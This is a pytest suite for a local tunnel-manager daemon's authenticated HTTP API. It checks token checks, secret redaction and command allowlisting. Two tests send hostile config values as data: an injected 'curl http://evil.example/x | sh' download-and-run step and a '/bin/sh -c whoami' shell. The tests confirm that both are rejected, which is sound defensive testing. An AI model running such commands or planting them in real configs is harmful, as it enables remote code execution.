"""The daemon's HTTP surface: what it refuses, and what it never says.

This process runs a command from a config file that its own web UI can edit, and
it relays passwords. Both of those make the boring assertions here — 401 without
a token, no secret in a response body — the point of the file rather than
scaffolding around it.
"""
from __future__ import annotations

import json

import pytest
from fastapi.testclient import TestClient

from bridge.config import Store
from bridge.server import create_app, resolve_token
from bridge.supervisor import Supervisor

TOKEN = "test-ui-token"
AUTH = {"Authorization": "Bearer " + TOKEN}


#: Ports nothing in this repo ever binds. 8787 is agent-bridge's own default,
#: so a test that asserted "unreachable" against it would pass or fail
#: depending on whether a gateway happened to be running on the machine.
DEAD = 18787
DEAD_TOO = 18788


def _document():
    return {
        "default": "midway5",
        "gateways": {
            "midway5": {
                "base_url": f"http://localhost:{DEAD}",
                "token": "the-gateway-bearer-token",
                "ssh": f"ssh -N -L {DEAD}:localhost:8787 midway5",
            },
            "plain": {"base_url": f"http://localhost:{DEAD_TOO}"},
        },
    }


@pytest.fixture
def app(tmp_path, monkeypatch):
    path = tmp_path / "gateways.json"
    path.write_text(json.dumps(_document()), encoding="utf-8")
    store = Store.load(str(path))
    # No real probing: the point here is the HTTP surface, and a live TCP
    # connect per row would make these tests slow and flaky in equal measure.
    sup = Supervisor(store, probe=lambda base: {
        "state": "refused", "reachable": False,
        "detail": "nothing is listening", "version": None, "latency_ms": None})
    client = TestClient(create_app(sup, TOKEN))
    yield client, sup, path
    sup.stop()


def test_everything_needs_the_token(app):
    client, _sup, _path = app
    for method, path in [
        ("GET", "/v1/state"),
        ("POST", "/v1/tunnels/midway5/up"),
        ("POST", "/v1/tunnels/midway5/down"),
        ("POST", "/v1/tunnels/midway5/answer"),
        ("GET", "/v1/tunnels/midway5/output"),
        ("PUT", "/v1/gateways/x"),
        ("DELETE", "/v1/gateways/midway5"),
        ("GET", "/v1/gateways/midway5/jobs"),
        ("POST", "/v1/events/ticket"),
    ]:
        res = client.request(method, path, json={})
        assert res.status_code == 401, f"{method} {path} was {res.status_code}"


def test_a_wrong_token_is_not_a_hint(app):
    client, _sup, _path = app
    res = client.get("/v1/state", headers={"Authorization": "Bearer nearly"})
    assert res.status_code == 401


def test_the_state_never_carries_a_gateway_token(app):
    """The browser has no business holding the gateway's bearer token, and the
    daemon proxies reads precisely so it does not have to."""
    client, _sup, _path = app
    body = client.get("/v1/state", headers=AUTH).text
    assert "the-gateway-bearer-token" not in body
    rows = json.loads(body)["gateways"]
    midway = [row for row in rows if row["gateway"]["name"] == "midway5"][0]
    assert midway["gateway"]["has_token"] is True
    assert midway["gateway"]["token_source"] == "inline"


def test_state_shows_the_tunnel_and_the_endpoint_separately(app):
    client, _sup, _path = app
    rows = client.get("/v1/state", headers=AUTH).json()["gateways"]
    by_name = {row["gateway"]["name"]: row for row in rows}
    assert by_name["midway5"]["tunnel"]["state"] == "stopped"
    assert by_name["midway5"]["gateway"]["tunnelled"] is True
    # A gateway with no ssh command still appears: it is reachable or it is not,
    # and that answer belongs on the same page.
    assert by_name["plain"]["tunnel"] is None
    assert by_name["plain"]["endpoint"]["state"] == "refused"


def test_starting_a_gateway_with_no_ssh_command_says_so(app):
    client, _sup, _path = app
    res = client.post("/v1/tunnels/plain/up", headers=AUTH)
    assert res.status_code == 409
    assert res.json()["error"]["code"] == "tunnel_unavailable"
    assert "no ssh command" in res.json()["error"]["message"]


def test_an_unknown_gateway_is_a_409_naming_it(app):
    client, _sup, _path = app
    res = client.post("/v1/tunnels/nope/up", headers=AUTH)
    assert res.status_code == 409
    assert "nope" in res.json()["error"]["message"]


def test_answering_when_nothing_is_running_is_refused_not_swallowed(app):
    client, _sup, _path = app
    res = client.post("/v1/tunnels/midway5/answer", headers=AUTH,
                      json={"text": "hunter2"})
    assert res.status_code == 409
    assert "no live process" in res.json()["error"]["message"]


def test_an_edit_is_written_and_reconciled(app):
    client, sup, path = app
    res = client.put("/v1/gateways/newbie", headers=AUTH, json={
        "base_url": "http://localhost:9001",
        "ssh": "ssh -N -L 9001:localhost:9001 other"})
    assert res.status_code == 200, res.text
    assert res.json()["gateway"]["ssh"][0] == "ssh"

    written = json.loads(path.read_text(encoding="utf-8"))
    assert written["gateways"]["newbie"]["base_url"] == "http://localhost:9001"
    # Reconciled without a restart: the supervisor now has a tunnel for it.
    assert sup.tunnel("newbie") is not None


def test_an_edit_that_wants_a_shell_is_refused_with_a_reason(app):
    client, _sup, path = app
    res = client.put("/v1/gateways/midway5", headers=AUTH, json={
        "base_url": f"http://localhost:{DEAD}",
        "ssh": "ssh midway5 && curl http://evil.example/x | sh"})
    assert res.status_code == 400
    assert res.json()["error"]["code"] == "bad_config"
    assert "shell characters" in res.json()["error"]["message"]
    unchanged = json.loads(path.read_text(encoding="utf-8"))
    assert "evil.example" not in json.dumps(unchanged)


def test_an_edit_may_not_run_an_arbitrary_program(app):
    """The single most important assertion in this file: the UI is a text field
    that feeds `subprocess`, and only the allowlist stands between the two."""
    client, _sup, path = app
    res = client.put("/v1/gateways/midway5", headers=AUTH, json={
        "base_url": f"http://localhost:{DEAD}",
        "ssh": "/bin/sh -c whoami"})
    assert res.status_code == 400
    assert "must start with one of" in res.json()["error"]["message"]
    assert "/bin/sh" not in path.read_text(encoding="utf-8")


def test_deleting_a_gateway_stops_its_tunnel_and_rewrites_the_file(app):
    client, sup, path = app
    assert sup.tunnel("midway5") is not None
    res = client.delete("/v1/gateways/midway5", headers=AUTH)
    assert res.status_code == 200
    assert sup.tunnel("midway5") is None
    written = json.loads(path.read_text(encoding="utf-8"))
    assert "midway5" not in written["gateways"]


def test_making_a_gateway_default_keeps_the_file_loadable_by_ab(app):
    client, _sup, path = app
    assert client.post("/v1/gateways/plain/default",
                       headers=AUTH).status_code == 200
    from client.abclient import load_gateways
    assert load_gateways(str(path)).default == "plain"


def test_the_event_stream_refuses_anything_but_a_ticket(app):
    """`EventSource` cannot send a header, and the real token in a query string
    would sit in browser history — so the stream takes a ticket instead, and
    nothing else.

    The 401s are checked here because they are answered before any streaming
    starts. The ticket's own lifecycle is `test_a_ticket_is_good_for_one
    _connection_and_thirty_seconds`, which does not need a socket at all: an
    SSE response is by design endless, and asserting on one through
    `TestClient` deadlocks its portal on teardown."""
    client, _sup, _path = app
    assert client.get("/v1/events").status_code == 401
    assert client.get("/v1/events?ticket=made-up").status_code == 401
    body = client.get("/v1/events?ticket=made-up").json()
    assert body["error"]["code"] == "bad_ticket"


def test_a_ticket_is_good_for_one_connection_and_thirty_seconds():
    from bridge.server import Tickets

    tickets = Tickets()
    ticket = tickets.issue()
    assert tickets.redeem(ticket) is True
    assert tickets.redeem(ticket) is False, "single use"
    assert tickets.redeem("") is False
    assert tickets.redeem("invented") is False

    stale = tickets.issue()
    tickets._live[stale] = 0.0            # as if it were issued long ago
    assert tickets.redeem(stale) is False, "expires whether or not it is used"


def test_reading_jobs_through_a_down_tunnel_says_it_is_the_tunnel(app):
    """The overwhelmingly likely cause of a failed read is the forward, so the
    page should not have to infer that from a 500."""
    client, _sup, _path = app
    res = client.get("/v1/gateways/midway5/jobs", headers=AUTH)
    assert res.status_code == 502
    assert res.json()["error"]["code"] == "gateway_unreachable"
    assert res.json()["error"]["detail"]["gateway"] == "midway5"


def test_the_read_proxy_is_read_only(app):
    """An open proxy on loopback would let any page in the browser submit or
    cancel jobs through the gateway. These four routes cannot do anything but
    look."""
    client, _sup, _path = app
    for method in ("POST", "PUT", "DELETE", "PATCH"):
        res = client.request(method, "/v1/gateways/midway5/jobs",
                             headers=AUTH, json={})
        assert res.status_code == 405, f"{method} was {res.status_code}"
    assert client.post("/v1/gateways/midway5/jobs/abc/cancel",
                       headers=AUTH, json={}).status_code == 404


def test_the_page_is_self_contained_and_not_cacheable(app):
    client, _sup, _path = app
    res = client.get("/")
    assert res.status_code == 200, "the page itself needs no token; the API does"
    assert res.headers["cache-control"] == "no-store"
    assert "default-src 'none'" in res.headers["content-security-policy"]
    body = res.text
    assert TOKEN not in body, "the token comes from the fragment, not the body"
    import re
    external = set(re.findall(r"https?://(?!localhost|127\.)[a-z0-9.-]+", body))
    assert not external, f"a tool for fixing a broken network fetched {external}"


def test_the_event_list_reads_in_elapsed_time_not_sequence_numbers(app):
    """"Where in the run did this happen" is the reader's question; a sequence
    number only answers which came first. The gateway already computes both
    `elapsed` and `elapsed_hms` (tests/backend/test_events.py), so the page
    prefers its answer rather than deriving one."""
    client, _sup, _path = app
    body = client.get("/").text
    assert "elapsed_hms" in body
    assert "ev.elapsed" in body, "with a numeric fallback for an older gateway"
    assert '<span class="seq">' not in body, "the seq column is gone"
    assert 'title="' in body and "seq " in body, "the sequence number is kept"


def test_a_token_is_always_resolved_even_if_none_was_given(monkeypatch):
    """An unauthenticated port that can rewrite and run an ssh command is not a
    convenience."""
    monkeypatch.delenv("AGENT_BRIDGE_UI_TOKEN", raising=False)
    generated = resolve_token(None)
    assert len(generated) >= 24
    assert resolve_token("explicit") == "explicit"
    monkeypatch.setenv("AGENT_BRIDGE_UI_TOKEN", "from-env")
    assert resolve_token(None) == "from-env"


def test_the_page_puts_connecting_and_configuring_on_the_gateway(app):
    """The list is a list; what you do *to* a gateway lives on its own page,
    behind tabs that are in the url so a reload lands where you were."""
    client, _sup, _path = app
    body = client.get("/").text
    for marker in ('"#/g/"', "gatewayView", "logPane", "configPane", "tabBar",
                   "connectButton"):
        assert marker in body, marker
    assert '"log"' in body and '"config"' in body, "tabs are named in the route"


def test_hover_reveals_the_row_actions_from_the_same_selector(app):
    """The highlight and the buttons are one gesture. They used to hang off two
    different elements (`.item` and `.card`) with a transition on only one, so
    they arrived at different moments and on different hit areas."""
    client, _sup, _path = app
    body = client.get("/").text
    assert ".item:hover .actions.onrow" in body
    assert ".item.click:hover, .item.click:focus-within" in body
    assert "transition:opacity" not in body, "instant, so they cannot disagree"
